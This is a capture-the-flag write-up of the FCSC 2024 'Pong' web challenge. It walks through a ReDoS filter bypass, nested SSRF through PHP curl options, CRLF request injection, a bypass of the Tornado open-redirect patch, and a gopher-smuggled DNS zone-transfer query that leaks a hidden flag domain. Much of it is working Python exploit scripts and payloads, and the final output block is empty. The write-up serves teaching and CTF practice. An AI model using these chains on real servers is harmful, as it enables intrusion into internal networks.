---
title: "Pong [EN]| FCSC 2024"
date: 2024-04-12T12:00:00Z
description: "Here's a full writeup of the 'Pong' web challenge created by Bitk & Mizu at FCSC 2024."
tags: ["curl","ssrf","php","gopher","cve", "tornado"]
keywords: ["curl", "ssrf", "gopher"]
---
[//]: <> (Wrote By Vozec 12/04/2024)
---

# Introduction

```
Ping.

Note : l'infra n'a pas accès à internet.
```

The sources for this challenge are provided:
```bash
.
├── docker-compose.yml
└── src
    ├── backend
    │   ├── Dockerfile
    │   └── src
    │       ├── app.py
    │       ├── public
    │       │   ├── index.html
    │       │   └── js
    │       │       └── main.js
    │       └── requirements.txt
    ├── dns
    │   ├── Dockerfile
    │   └── src
    │       ├── dns_server.py
    │       └── requirements.txt
    ├── flag
    │   ├── Dockerfile
    │   └── src
    │       ├── app.js
    │       └── package.json
    └── frontend
        ├── Dockerfile
        └── src
            ├── curl-7.71.0.tar.gz
            └── index.php
```

The challenge consists of 4 machines: 
- a frontend server
- a backend server
- a dns server
- a flag server

The service names defined in the `docker-compose.yml` file are:
- *pong-frontend*
- *pong-backend*
- *pong-internal-dns*
- *pong-flag*

This detail will be important for the future.

The application exposes a single **8000** port on which *pong-frontend* is exposed; this is our entry point.

# Pong-frontend analysis

Here are the contents of `index.php` : 

```php
<?php

if (isset($_GET["source"])) {
    highlight_file("index.php");
    exit();
}

$_GET["game"] = $_GET["game"] ?? "pong";
if (preg_match("/[^a-z\.]|((.{10,})+\.)+$|[a-z]{10,}/", $_GET["game"])) {
    echo "403 Forbidden!";
    exit();
}

$ch = curl_init();
$options = [ CURLOPT_URL => "http://" . $_GET["game"] . ".fcsc2024.fr:5000" ];

if ($_SERVER["REMOTE_ADDR"] === "127.0.0.1" && isset($_GET["options"])) {
    $options += $_GET["options"];
}

curl_setopt_array($ch, $options);
curl_exec($ch);

```

It is possible to provide `2` parameters to the app, the ``game`` parameter and the ``options`` one.

A ``game`` check is performed with a regex, then the application performs a query on ``http://<game>.fcsc2024.fr:5000"``.  
Finally, if *REMOTE_ADDR* is equal to ``127.0.0.1``, then the specified options are added to the curl request.  
Obviously, the following challenge starts with a Server Side Request Forgery (SSRF).  

To give you a clearer idea of what's involved, here's the code base I used to send my requests: 

```python
from pwn import *

context.log_level = 'critical'

io = remote('localhost', 8000, ssl=False)

payload =f'''
/?game=pong
'''[1:-1]

io.send(f'''
GET {payload} HTTP/1.1\r
Host: localhost:8000\r
Connection: close\r
Upgrade-Insecure-Requests: 1\r
\r
\r
'''[1:-1].encode())

result = io.recvall(timeout=30)
print(result.decode())
```

## First vulnerability on frontend.fcsc2024.fr

The first thing that intrigued me was the use of this regex: ``"/[^a-z\.]|((.{10,})+\.)+$|[a-z]{10,}/"``, in theory, this forces the user to enter:  
- A character string with the letters ``abcdefghijklmnopqrstuvwxyz.``.  
- A character string up to 9 characters long.   

However, it is possible to provoke a ReDoS *(Regular expression Denial of Service)* attack by sending a large succession of ``.`` . So by sending a string of characters of the form ``voz.ec.voz.ec.voz.ec.voz.ec.voz.ec.voz.ec.voz.ec.voz.ec.voz.ec.voz.ec.voz.ec.voz.ec.voz.ec.voz.ec.voz.ec.voz.ec.voz.ec.voz.ec.voz.ec.voz.ec.voz.ec.voz.ec`` the ``preg_match`` function will crash.  
Finally, the default error result is *false*, allowing you to bypass these checks.  

By combining docker aliases with redos, it's possible to query the application's internal services.  

Our operating code can be updated:  
```python
from pwn import *
from urllib.parse import quote_plus as urlenc

context.log_level = 'critical'

io = remote('localhost', 8000, ssl=False)

redos = urlenc('?a='+'.'.join('voz.ec' for _ in range(30)))
payload =f'''
/?game=pong-frontend{redos}
'''[1:-1]

io.send(f'''
GET {payload} HTTP/1.1\r
Host: localhost:8000\r
Connection: close\r
Upgrade-Insecure-Requests: 1\r
\r
\r
'''[1:-1].encode())

result = io.recvall(timeout=30)
print(str(result)[2:-1].replace('\\n','\n'))
```

## Bypass REMOTE_ADDR

To bypass the ip check, a curl request can be made from the frontend to the fronted.  
Combined with the redos method, it's possible to pass *GET* arguments to the 2nd request.  

You can also add *options* to curl!  
These come from the ``php-curl`` library and can be used in int form. For each option, there's an int equivalent, allowing you to pass options as parameters.

All options for ``curl_setopt`` are listed here:   
- https://www.php.net/manual/en/function.curl-setopt.php  

The equivalents are referenced here:   
- https://gist.github.com/jseidl/3218673   
They can also be retrieved in php.  
```php
php > echo CURLOPT_USERAGENT;
10018
```

By adding ``&b=`` to the end of the url, the url formed will be the following: 

```
http://<game>?a=<redos>&options[...]=...&b=.fcsc2024.fr:5000
```

```python
from pwn import *
from urllib.parse import quote_plus as urlenc

context.log_level = 'critical'

redos = urlenc('?a='+'.'.join('voz.ec' for _ in range(30)))

def ssrf(where, options):
	io = remote('localhost', 8000, ssl=False)
	payload =f'''
/?game=localhost{redos}%26game%3d{where}{options}%26b%3D
'''[1:-1]
	io.send(f'''
GET {payload} HTTP/1.1\r
Host: localhost:8000\r
Connection: close\r
Upgrade-Insecure-Requests: 1\r
\r
\r
'''[1:-1].encode())

	result = io.recvall(timeout=30)
	print(str(result)[2:-1].replace('\\n','\n'))

mapping = {
	'CURLOPT_USERAGENT': '10018'
}
options = '&'.join([
	'',
	'options[CURLOPT_USERAGENT]=HelloThere',
])

for k, v in mapping.items():
	options = options.replace(k, v)


ssrf(
    where='pong',
    options=urlenc(options)
)
```

Finally, to check that the options have been added correctly, I've added a listening TCP socket to debug received requests and view them in raw.

Here's the executed application: 
```python
import socket, os, sys

print(f'Listening on port 2222', flush=True)

server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    
server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
server_socket.bind(('0.0.0.0', 2222))    
server_socket.listen(5)

i = 0  

while True:
    client_socket, client_address = server_socket.accept() 
    data = client_socket.recv(2048)
    data_dec = str(data)[2:-1].replace("\\n", "\\n\n")
    print(f'''
------------------------------------------------
Request: {str(i)}'
------------------------------------------------
Data: 
{str(data)}

Decoded:
{data_dec}
------------------------------------------------

''', flush=True)
    i += 1
    client_socket.close()
```

You can check that the options are actually being used, using the User-Agent for example: 

```python
ssrf(
    where='host.docker.internal:2222',
    options=urlenc(options)
)
```

The result is  
```python
------------------------------------------------
Request: 0'
------------------------------------------------
Data:
b'GET /?a=voz.ec.voz.ec.voz.ec.voz.ec.voz.ec.voz.ec.voz.ec.voz.ec.voz.ec.voz.ec.voz.ec.voz.ec.voz.ec.voz.ec.voz.ec.voz.ec.voz.ec.voz.ec.voz.ec.voz.ec.voz.ec.voz.ec.voz.ec.voz.ec.voz.ec.voz.ec.voz.ec.voz.ec.voz.ec.voz.ec.fcsc2024.fr:5000 HTTP/1.1\r\nHost: host.docker.internal:2222\r\nUser-Agent: HelloThere\r\nAccept: */*\r\n\r\n'

Decoded:
GET /?a=voz.ec.voz.ec.voz.ec.voz.ec.voz.ec.voz.ec.voz.ec.voz.ec.voz.ec.voz.ec.voz.ec.voz.ec.voz.ec.voz.ec.voz.ec.voz.ec.voz.ec.voz.ec.voz.ec.voz.ec.voz.ec.voz.ec.voz.ec.voz.ec.voz.ec.voz.ec.voz.ec.voz.ec.voz.ec.voz.ec.fcsc2024.fr:5000 HTTP/1.1
Host: host.docker.internal:2222
User-Agent: HelloThere
Accept: */*


------------------------------------------------
```


# Analysis of the 3 other services.  
The service we're most interested in is the one that returns the flag: 
- ``pong-flag.fcsc2024.fr``

It's a nodejs application, exposed internally on port 3000: 

```js
const express = require("express");
const app  = express();
const PORT = 3000;

app.use((req, res, next) => {
    if (req.headers["host"] !== `${process.env.FLAG_DOMAIN}.fcsc2024.fr:${PORT}`) {
        res.send("403 Forbidden!");
        return;
    }
    res.send(process.env.FLAG);
})

app.listen(PORT, () => {
    console.log(`Pong running on port ${PORT}`);
});
```

The application returns the flag if the `HOST` header of our request matches the machine's domain.

In the `docker-compose.yml` provided, the example domain is ``fake_domain``. Note the following comment: 
```
# not the same on the remote instance
```

We can confirm our understanding of the code by using ssrf: 

```python
ssrf(
    where='fake_domain.fcsc2024.fr:3000',
    options=urlenc(options)
)
```

*Output:* 
```bash
$ python3 pong_lab.py
HTTP/1.1 200 OK
Date: Fri, 12 Apr 2024 02:17:10 GMT
Server: Apache/2.4.59 (Unix)
X-Powered-By: PHP/8.2.17
Content-Length: 22
Connection: close
Content-Type: text/html; charset=UTF-8

FCSC{flag_placeholder}
```

Great! We know how to find the flag, we just need to know the subdomain of *fcsc2024.fr* and make a simple request via the ssrf.

### Service pong

On port *5000* of ``pong.fcsc2024.fr`` is exposed a site coded in python with the framework [Tornado](https://github.com/tornadoweb/tornado)

Here are the application files:

- ``public/js/main.js``
```js
// TODO
```

- ``public/index.html``
```js
...
```

- ``app.py``
```python
import tornado.ioloop
import tornado.web

tornado.web._unicode = lambda value: value.decode("utf-8", "replace")

def make_app():
    return tornado.web.Application([
        (r"/?(.*)", tornado.web.StaticFileHandler, { "path": "public", "default_filename": "index.html" }),
    ])

if __name__ == "__main__":
    app = make_app()
    app.listen(5000)
    tornado.ioloop.IOLoop.current().start()

```

This is the application that contains the "pong" game, visible when the application is used legitimately.  
This service will be used in the rest of the operation.


### Service dns
Finally, the infra. contains an internal DNS, coded in Python: 
```python
from dnslib.server import DNSServer, BaseResolver
from dnslib import RR, QTYPE, RCODE, A
from dns import resolver
from os import environ
import threading

DOMAINS = {
    "frontend.fcsc2024.fr.": environ["FRONTEND_IP"],
    "pong.fcsc2024.fr.": environ["BACKEND_IP"],
    "red.fcsc2024.fr.": environ["REDIRECT_IP"],
    "listen.fcsc2024.fr.": environ["LISTEN_IP"],
    f"{environ['FLAG_DOMAIN']}.fcsc2024.fr.": environ["FLAG_IP"]
}

class LocalDNS(BaseResolver):
    def resolve(self, request, handler):
        reply = request.reply()
        q = request.q

        print('', flush=True)

        if q.qtype == QTYPE.A and str(q.qname) in DOMAINS:
            reply.add_answer(RR(q.qname, QTYPE.A, rdata=A(DOMAINS[str(q.qname)])))
        elif q.qtype == QTYPE.A:
            default_resolver = resolver.Resolver()
            try:
                answers = default_resolver.resolve(str(q.qname), "A")
                for answer in answers:
                    reply.add_answer(RR(q.qname, QTYPE.A, rdata=A(answer.address)))
            except:
                reply.header.rcode = RCODE.NXDOMAIN
        elif q.qtype == QTYPE.AXFR and str(q.qname) == "fcsc2024.fr.":
            for domain, ip in DOMAINS.items():
                reply.add_answer(RR(domain, QTYPE.A, rdata=A(ip)))
        else:
            reply.header.rcode = RCODE.NXDOMAIN

        return reply

def run_server(protocol):
    resolver = LocalDNS()
    server = DNSServer(resolver, address="0.0.0.0", port=53, tcp=(protocol == "TCP"))
    server.start()

if __name__ == "__main__":
    threading.Thread(target=run_server, args=("TCP",)).start()
    threading.Thread(target=run_server, args=("UDP",)).start()

```

This implements DNS queries:
- *A* type queries  
- *AXFR* queries  

The first type is used to resolve ``domain -> ip`` and the second to list subdomains registered for ``fcsc2024.fr``.

## Problem:

It seems easy to retrieve the flag knowing the complete domain of the *pong-flag* service. On the other hand, retrieving the sub-domain seems more difficult.

The difficulty of this challenge lies not only in the complexity of the requests: 
- Triple ssrf
- Double bypass ReDos  
but also in finding the right domain name to query.

## First track:

The idea here is to find a way of querying the internal DNS server by forging an ``AXFR`` request.

The ``HTTP`` and ``DNS`` protocols are completely different, and although they are (in our case) both used via TCP sockets, they are syntactically different.

So, from the ssrf, we have to: 
- find the TCP packet to send
- find a way to arbitrarily send raw to the tcp socket.

## Creating the DNS query.

The simplest way to forge this query is to use the ``dig`` tool (*bind-tools*) accross a docker in the infra network to query the DNS server.  
To retrieve the raw bytes, I specify my TCP listener and port 2222 and make the query:

```bash
dig @host.docker.internal -p 2222 fcsc2024.fr AXFR
```

I received the 3 TCP requests below: (hexadecimal)
- 00346bb0002000010000000000010866637363323032340266720000fc000100002904d000000000000c000a0008f7bdbcaef5f90ee6
- 00341199002000010000000000010866637363323032340266720000fc000100002904d000000000000c000a0008f7bdbcaef5f90ee6

- 0034e4f6002000010000000000010866637363323032340266720000fc000100002904d000000000000c000a0008f7bdbcaef5f90ee6

You can check that they work as expected:
```bash
$ echo <hex> | xxd -r -p | nc pong-internal-dns 53
```
*Output*:
```
���fcsc2024frfrontend�

pong�

fake_domain�
```

Bingo! Our DNS request works, now we just need to send it to ``pong-internal-dns`` on port 53.

## Sends arbitrary raw bytes to DNS.

The format of an HTTP request is as follows: 

```
<method> <path> HTTP/<version>\r
<header_key1>: <header_value1>\r
...
<header_keyX>: <header_valueX>\r
\r

```

Exemple:
```
GET / HTTP/1.1\r
Connection: Close\r
Accept: */*\r
Host: localhost:8000\r
\r
```

The first idea I thought of was to take advantage of a vulnerability in the ``php-curl'' library: a *CRLF* injection.  

Indeed, according to this post:   
- https://gist.github.com/tomnomnom/6727d7d3fabf5a4ab20703121a9090da

You can inject a line break ("\r\n") in the following parameters to take control of the data sent:  

- CURLOPT_HTTPHEADER
- CURLOPT_COOKIE
- CURLOPT_RANGE
- CURLOPT_REFERER
- CURLOPT_USERAGENT
- CURLOPT_PROXYHEADER

So by sending the CURLOPT_USERAGENT header with the following values: 
```python
CURLOPT_USERAGENT = '''
Fake_UserAgent\r
\r
GET /abc HTTP/1.1
Host: localhost:8000\r
Connection: Close\r
X-foo:
'''[1:-1]
```
a second request on */abc* will be sent.

However, it is not possible to define these options with raw-bytes. In fact, curl prevents null-bytes *(\x00)* from being included in parameter values.  
What's more, the response to this 2nd request was not displayed, which defeated the whole purpose of ssrf.  

### In-depth search of curl's hidden options.

This is undoubtedly the part that took me the longest in solving this challenge.  

I explored many tracks before completing the full exploitation. 
Here are a few of them:  
- Searching for interesting vulnerabilities on [curl.se](https://curl.se/docs/vuln-7.71.1.html)  
- CRLF attempt in various parameters.  
- Attempt to send bytes via proxie and pre-proxie connections *(socks4/socks5)*.  
- Manipulation of default protocol  
- Manipulation of default method  

**Curl is too restrictive to allow bytes to be sent via the HTTP protocol.** 
The only solution is to switch to a less restrictive protocol: ``gopher`` or ``telnet``.  
 
This is the gopher protocol I've chosen. This protocol is often used for SSRF exploitation.  
In fact, it allows any bytes to be sent in TCP, enabling different actions to be carried out using different protocols.  

A gopher url looks like this: ``gopher://<ip>:<port>/_<tcp data urlencoded>``
It's important to leave a character (here ``_``) between the ``/`` and the TCP data.  


Before presenting the working solution, it's important to note the various options available to us:  
- The first would be to leave the CURL url protocol blank and change the default protocol: *(CURLOPT_DEFAULT_PROTOCOL)*.  
- The second method would be to find an arbitrary redirect (OpenRedirect) to a url of our choice.  

Unfortunately, although option 1 is technically easier, it seems impossible because of the prefix: ``http://`` added by index.php on *frontend.fcsc2024.fr*.  

So we'll need to find an [OpenRedirect](https://portswigger.net/kb/issues/00500100_open-redirection-reflected) to redirect the url to a protocol of our choice.  

### Confirmation of exploitation path:  
To ensure that this scenario could be used, I deployed a flask application: ``http://red.fcsc2024.fr:5000/`` in the infrastructure.   

Here's the code: 
```python
from flask import Flask, redirect, url_for, request

app = Flask(__name__)

@app.route('/')
def redirection():
    destination_url = request.args.get('redirect')
    return redirect(destination_url, code=302)

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=4444)

```
This application is an Open-Redirect-As-A-Service, allowing me to redirect my url to wherever I want.
So I've completed the piece of the puzzle that was missing from the full operation.

Once I've added it to DNS, we can test how it works:
```bash
/usr/app # curl -v http://red.fcsc2024.fr:4444?redirect=gopher://pong-internal-dns:53/_example
* Host red.fcsc2024.fr:4444 was resolved.
* IPv6: (none)
* IPv4: 10.0.0.6
*   Trying 10.0.0.6:4444...
* Connected to red.fcsc2024.fr (10.0.0.6) port 4444
> GET /?redirect=gopher://pong-internal-dns:53/_example HTTP/1.1
> Host: red.fcsc2024.fr:4444
> User-Agent: curl/8.5.0
> Accept: */*
>
< HTTP/1.1 302 FOUND
< Server: Werkzeug/3.0.2 Python/3.11.8
< Date: Fri, 12 Apr 2024 03:39:06 GMT
< Content-Type: text/html; charset=utf-8
< Content-Length: 263
< Location: gopher://pong-internal-dns:53/_example
< Connection: close
<
<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="gopher://pong-internal-dns:53/_example">gopher://pong-internal-dns:53/_example</a>. If not, click the link.
* Closing connection
```


We get our 302 response with a redirect to ``gopher://pong-internal-dns:53/_example``.  

In order to make the link with the previous section on CUrl, here are the must-have options for ssrf:

- ``CURLOPT_FOLLOWLOCATION`` to ``1`` : Follow the redirection.
- ``CURLOPT_REDIR_PROTOCOLS`` to ``gopher`` or ``CURLPROTO_GOPHER`` : Enables the **gopher** redirection protocol *(Default: HTTP)*.

If we test the combination of: 
- From the url to *pong-redirect.fcsc2024.fr*
- DNS query in raw bytes
- CUrl options  
we get: 

```python
mapping = {
	'CURLOPT_FOLLOWLOCATION': '52',
	'CURLOPT_CUSTOMREQUEST': '10036',
	'CURLOPT_REDIR_PROTOCOLS': '182',
	'CURLPROTO_GOPHER': '33554432',
}

options = '&'.join([
	'',
	'options[CURLOPT_FOLLOWLOCATION]=1',
	'options[CURLOPT_REDIR_PROTOCOLS]=CURLPROTO_GOPHER',
])

for k, v in mapping.items():
	options = options.replace(k, v)

axfr = "%004n%DB%00%20%00%01%00%00%00%00%00%01%08fcsc2024%02fr%00%00%FC%00%01%00%00%29%04%D0%00%00%00%00%00%0C%00%0A%00%08I%B8%29%3C05P%8A"


target_url = urlenc(f'gopher://pong-internal-dns:53/_{axfr}')

ssrf(
    where=urlenc(urlenc(f'red.fcsc2024.fr:4444/?redirect={target_url}') + redos),
    options=urlenc(options)
)
```

*Output:*
```bash
HTTP/1.1 200 OK
Date: Fri, 12 Apr 2024 04:00:45 GMT
Server: Apache/2.4.59 (Unix)
X-Powered-By: PHP/8.2.17
Content-Length: 148
Connection: close
Content-Type: text/html; charset=UTF-8

\x00\x92n\xdb\x84\xa0\x00\x01\x00\x05\x00\x00\x00\x00\x08fcsc2024\x02fr\x00\x00\xfc\x00\x01\x08frontend\xc0\x0c\x00\x01\x00\x01\x00\x00\x00\x00\x00\x04\n\x00\x00\x02\x04pong\xc0\x0c\x00\x01\x00\x01\x00\x00\x00\x00\x00\x04\n\x00\x00\x04\x03red\xc0\x0c\x00\x01\x00\x01\x00\x00\x00\x00\x00\x04\n\x00\x00\x06\x06listen\xc0\x0c\x00\x01\x00\x01\x00\x00\x00\x00\x00\x04\n\x00\x00\x07\x0bfake_domain\xc0\x0c\x00\x01\x00\x01\x00\x00\x00\x00\x00\x04\n\x00\x00\x05
```

Great, all the fcsc2024.fr domains can be found, including the flag domain: ``fake_domain``.

## Discover of the real Open-redirect :

Now that we know that an Open-redirect will allow us to retrieve the secret domain, let's turn our attention to the last non-exploited service: **The tornado server!  

As explained above, the Tornado server is used to host the pong game, and contains 2 resource files:  

- /static/index.html
- /js/main.js

Their content isn't really important, but we'll have to pay attention to the server code below: 

```python
import tornado.ioloop
import tornado.web

tornado.web._unicode = lambda value: value.decode("utf-8", "replace")

def make_app():
    return tornado.web.Application([
        (r"/?(.*)", tornado.web.StaticFileHandler, { "path": "public", "default_filename": "index.html" }),
    ])

if __name__ == "__main__":
    app = make_app()
    app.listen(5000)
    tornado.ioloop.IOLoop.current().start()
```

The first striking thing is the 4th line: an internal element of the server is modified.   
It's likely to play a part in the vulnerability we're looking for.  

It seems that the application defines a ``tornado.web.StaticFileHandler`` to the ``public`` folder with the default file: ``index.html``.

If we refer to the official documentation on [tornado.web.StaticFileHandler](https://www.tornadoweb.org/en/stable/web.html#tornado.web.StaticFileHandler) we find the following code:  

```python
application = web.Application([
    (r"/content/(.*)", web.StaticFileHandler, {"path": "/var/www"}),
])
```

There's a difference here with regexes! 
The one we have is more lax, allowing HTTP requests to start with ``GET `` and not ``GET /``.  
This is a liberty worth noting for the future. 

I started by looking for ``tornado.web._unicode`` since that's what the service modifies.   
See the original code: [here](https://github.com/tornadoweb/tornado/blob/master/tornado/escape.py#L245-L260)  

```python
def to_unicode(value: Union[None, str, bytes]) -> Optional[str]:
    """Converts a string argument to a unicode string.

    If the argument is already a unicode string or None, it is returned
    unchanged.  Otherwise it must be a byte string and is decoded as utf8.
    """
    if isinstance(value, _TO_UNICODE_TYPES):
        return value
    if not isinstance(value, bytes):
        raise TypeError("Expected bytes, unicode, or None; got %r" % type(value))
    return value.decode("utf-8")


# to_unicode was previously named _unicode not because it was private,
# but to avoid conflicts with the built-in unicode() function/type
_unicode = to_unicode
```

This function simply takes bytes as parameters and decodes them. If an exception on the UTF-8 decoding of the parameter is raised, then the request crashes.

We can compare the patch: 
```python
Avant: value.decode("utf-8")
Aprés: value.decode("utf-8", "replace")
```

The addition of ``replace`` specifies that if the decoded character is not in the UTF-8 encoding, then it will be retained as is in the return.

*Exemple:*
```python
>>> a = b'\xff'

>>> a.decode("utf-8")
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
UnicodeDecodeError: 'utf-8' codec can't decode byte 0xff in position 0: invalid start byte

>>> a.decode("utf-8", "replace")
'�'
```

This is good news for us, as we're planning to send a TCP frame in a url on the server (Openredirect).

We can now concentrate on Tornado management for *StaticFileHandler*.
Searching for potential redirections, we come across [this code](https://github.com/tornadoweb/tornado/blob/master/tornado/web.py#L2846-L2903):

```python
 def validate_absolute_path(self, root: str, absolute_path: str) -> Optional[str]
        
        ....

            if not self.request.path.endswith("/"):
                if self.request.path.startswith("//"):
                    # A redirect with two initial slashes is a "protocol-relative" URL.
                    # This means the next path segment is treated as a hostname instead
                    # of a part of the path, making this effectively an open redirect.
                    # Reject paths starting with two slashes to prevent this.
                    # This is only reachable under certain configurations.
                    raise HTTPError(
                        403, "cannot redirect path with two initial slashes"
                    )
                self.redirect(self.request.path + "/", permanent=True)
                return None
            
        ....
```

This function is called when the path of a *StaticFileHandler* is reached.  
The server will check that the path provided corresponds to a folder defined as static by the ``web.Application`` configuration.  
If the path provided corresponds to a static folder and does not end with a ``/``, it will perform a redirection by adding a **/**.  

*Exemple*:
```
$ curl localhost:5000/js -v
* Host localhost:5000 was resolved.
* IPv6: ::1
* IPv4: 127.0.0.1
*   Trying [::1]:5000...
* Connected to localhost (::1) port 5000
> GET /js HTTP/1.1
> Host: localhost:5000
> User-Agent: curl/8.5.0
> Accept: */*
>
< HTTP/1.1 301 Moved Permanently
< Server: TornadoServer/6.4
< Content-Type: text/html; charset=UTF-8
< Date: Fri, 12 Apr 2024 13:45:38 GMT
< Location: /js/
< Content-Length: 0
<
* Connection #0 to host localhost left intact
```


An interesting comment is included in the code:
```
A redirect with two initial slashes is a "protocol-relative" URL.
This means the next path segment is treated as a hostname instead
of a part of the path, making this effectively an open redirect.
Reject paths starting with two slashes to prevent this.
This is only reachable under certain configurations.
```

It seems that an older version of the application is [vulnerable to an Open-Redirect](https://github.com/tornadoweb/tornado/commit/89aacf12f351dfde76fb8d3ac361dd489087d072)!
Let's find out more !  

In the github commit/issues, you'll find an update from May 2023 fixing the ``CVE-2023-28370`` (Open Redirect): 
- https://github.com/tornadoweb/tornado/releases/tag/v6.3.2
- https://security.snyk.io/vuln/SNYK-PYTHON-TORNADO-5537286

Finally, there's a patch test script: 
- https://github.com/tornadoweb/tornado/commit/6e3521da44c349197cf8048c8a6c69d3f4ccd971
- https://github.com/tornadoweb/tornado/pull/3276#issuecomment-1685080310

Here's the payload tested: 
```python
GET //evil.com/../usr/app/static/js
```

The ``os.path.join`` function returns ``/usr/app/static/js`` when ``os.path.dirname(__file__)`` and ``//evil.com/../usr/app/static/js`` are passed as parameters.

However, the link ``//evil.com`` is interpreted as an HTTP url by the browser and therefore redirects the user to an external site.

To prevent this vulnerability, the developers have added a check at the beginning of the redirection url: 
```python
if self.request.path.startswith("//"): 
    raise HTTPError(
        403, "cannot redirect path with two initial slashes"
    )
```

#### Bypassing the patch.

By adding a protocol to the url, it will still be vulnerable but will not start with ``//``.  
What's more, you'll need to adjust the number of ``../`` to get back to the root.

Adding a protocol to the url is possible thanks to the reggex weakness described above.

So we can send this kind of request: 
```
GET gopher://<dns>:53/_<axfr>#/../../../../usr/app/static/js
...

```

The application will retrieve the following path: 
```python
>>> import os.path
>>> os.path.join(
    'gopher://<dns>:53/_<axfr>/../../../../usr/app/static/js',
    '/usr/app/static/js'
)

'/usr/app/static/js'
```
The file's existence will be verified and then the redirection will take place.

There's one last flaw: the end of the url *(/../../../../usr/app/static/js)* must be ingested by gopher but not by tornado.

After testing 255 characters, only 3 were interesting!
-  \x00 
- ?
- \#

The ``\x00`` is an unappreciated character in curl, often causing errors when passed in a parameter.  
The ``?`` allows curl to perform the request on ``gopher://<dns>:53/_<axfr>`` but the python server doesn't perform the redirection because it interprets the rest of the *?* as a GET parameter.

So the ``#`` looks like a good candidate!


You can test the application deployed locally: 
```python
axfr = "%004n%DB%00%20%00%01%00%00%00%00%00%01%08fcsc2024%02fr%00%00%FC%00%01%00%00%29%04%D0%00%00%00%00%00%0C%00%0A%00%08I%B8%29%3C05P%8A"

io = remote('localhost', 5000)
io.send(f'''
GET gopher://pong-internal-dns:53/_{axfr}#/../../../../public/js HTTP/1.1
Host: localhost:5000
Accept: */*
Connection: close

'''[1:-1].encode())
print(str(io.recvall(timeout=2))[2:-1].replace('\\n', '\n'))	
```

*Output*
```bash
HTTP/1.1 301 Moved Permanently\r
Server: TornadoServer/6.4\r
Content-Type: text/html; charset=UTF-8\r
Date: Fri, 12 Apr 2024 13:48:10 GMT\r
Location: gopher://pong-internal-dns:53/_%004n%DB%00%20%00%01%00%00%00%00%00%01%08fcsc2024%02fr%00%00%FC%00%01%00%00%29%04%D0%00%00%00%00%00%0C%00%0A%00%08I%B8%29%3C05P%8A#/../../../../public/js/\r
Content-Length: 0\r
Connection: close\r
\r
```

### Last step

Now that we have the last element of our Kill-Chain, we need to find a way to send the following request to the python backend via curl : 

```
GET gopher://pong-internal-dns:53/_< ..axfr ..>#/../../../../public/js HTTP/1.1
Host: localhost:5000
Accept: */*
Connection: close
```

However, by default, curl has a ``/`` as its default query path.
So the following query: 

```php
<?php

$ch = curl_init();
$options = [CURLOPT_URL => "http://127.0.0.1:5000"];
curl_setopt_array($ch, $options);
curl_exec($ch);
```

will perform a query of the form: 
```bash
GET / HTTP/1.1\r
...
```

This is a problem here, as we want our sent path to start with ``gopher://...``.  

To solve this last problem, we'll use the CUrl **CURLOPT_CUSTOMREQUEST** option.  

According to the documentation, this parameter is used to redefine the method used during the http request:  
- *get*,*post*,*put*,*option*,*path* ...  

Making the link with *CRLF* injections presented earlier, we can define the method as:  
```
GET gopher://<..payload..> HTTP/1.1\r\nX-foo:
```

In this way, curl will perform the following query:
```
GET gopher://<..payload..> HTTP/1.1\r
X-foo: / HTTP/1.1\r
...
```
By passing a header name and line feed, anything following the legitimate request method will be interpreted as a header value and form a valid request.

## Pooling:

We can now complete the exploitation!
Here's the script:
```python
from pwn import *
from urllib.parse import quote_plus as urlenc

context.log_level = 'critical'

redos = urlenc('?a='+'.'.join('voz.ec' for _ in range(30)))

def nice_print(data):
	print(str(data.strip()).replace('\\r\\n', '\n')[2:-1])

def ssrf(where, options):
	io = remote('localhost', 8000, ssl=False)
	payload =f'''
/?game=localhost{redos}%26game%3d{where}{options}%26b%3D
'''[1:-1]
	io.send(f'''
GET {payload} HTTP/1.1\r
Host: localhost:8000\r
Connection: close\r
Upgrade-Insecure-Requests: 1\r
\r
\r
'''[1:-1].encode())

	result = io.recvall(timeout=30)
	nice_print(result)


axfr = "%004n%DB%00%20%00%01%00%00%00%00%00%01%08fcsc2024%02fr%00%00%FC%00%01%00%00%29%04%D0%00%00%00%00%00%0C%00%0A%00%08I%B8%29%3C05P%8A"

payload = f'''
gopher://pong-internal-dns:53/_{axfr}#/../../../../public/js
'''[1:-1]


mapping = {
	'CURLOPT_FOLLOWLOCATION': '52',
	'CURLOPT_CUSTOMREQUEST': '10036',
	'CURLOPT_REDIR_PROTOCOLS': '182',
	'CURLPROTO_GOPHER': '33554432',
}

options = '&'.join([
	'',
	'options[CURLOPT_FOLLOWLOCATION]=1',
	'options[CURLOPT_REDIR_PROTOCOLS]=CURLPROTO_GOPHER',
	'options[CURLOPT_CUSTOMREQUEST]='+urlenc(f'GET {payload} HTTP/1.1\r\nX-foo:'),
])

for k, v in mapping.items():
	options = options.replace(k, v)

ssrf(
    where='pong',
    options=urlenc(options)
)
```

*Output:*
```bash
$ python3 pong_lab.py
HTTP/1.1 200 OK
Date: Fri, 12 Apr 2024 14:02:26 GMT
Server: Apache/2.4.59 (Unix)
X-Powered-By: PHP/8.2.17
Content-Length: 148
Connection: close
Content-Type: text/html; charset=UTF-8

\x00\x92n\xdb\x84\xa0\x00\x01\x00\x05\x00\x00\x00\x00\x08fcsc2024\x02fr\x00\x00\xfc\x00\x01\x08frontend\xc0\x0c\x00\x01\x00\x01\x00\x00\x00\x00\x00\x04\n\x00\x00\x02\x04pong\xc0\x0c\x00\x01\x00\x01\x00\x00\x00\x00\x00\x04\n\x00\x00\x04\x03red\xc0\x0c\x00\x01\x00\x01\x00\x00\x00\x00\x00\x04\n\x00\x00\x06\x06listen\xc0\x0c\x00\x01\x00\x01\x00\x00\x00\x00\x00\x04\n\x00\x00\x07\x0bfake_domain\xc0\x0c\x00\x01\x00\x01\x00\x00\x00\x00\x00\x04\n\x00\x00\x05
```

One last small modification is to change: ``localhost`` to ``localhost@127.0.0.1`` because *localhost* doesn't resolve *127.0.0.1* on the remote server due to the reverse proxy.

If you run the query on the server, you get the following sub-domain:
```
37b9da922f6360e301faeff19bac866c1a042d4a
```

Via ssrf, you can go to ``37b9da922f6360e301faeff19bac866c1a042d4a.fcsc.fr:3000``.

```python
ssrf(
    where=f'localhost@37b9da922f6360e301faeff19bac866c1a042d4a.fcsc2024.fr:3000{redos}',
    options={}
)
```

*Output*: 
```
